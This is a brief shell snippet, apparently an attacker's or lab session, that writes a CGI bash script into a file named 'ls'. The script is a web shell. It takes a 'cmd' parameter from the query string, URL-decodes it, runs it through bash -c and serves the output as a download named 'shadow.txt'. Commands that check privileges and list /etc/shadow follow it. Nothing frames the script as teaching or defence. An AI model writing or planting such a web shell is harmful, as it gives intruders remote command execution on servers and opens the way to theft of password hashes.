nano ls
#!/bin/bash
echo "Content-Type: application/octet-stream"
echo "Content-Disposition: attachment; filename=\"shadow.txt\""
echo

cmd=$(echo "$QUERY_STRING" | sed -n 's/^cmd=\([^&]*\).*/\1/p' | sed -e 's/%20/ /g' -e 's/%3B/;/g' -e 's/%26/&/g' -e 's/%2F/\//g' -e 's/%3D/=/g')
bash -c "$cmd"
whoami
id
ls -l /etc/shadow
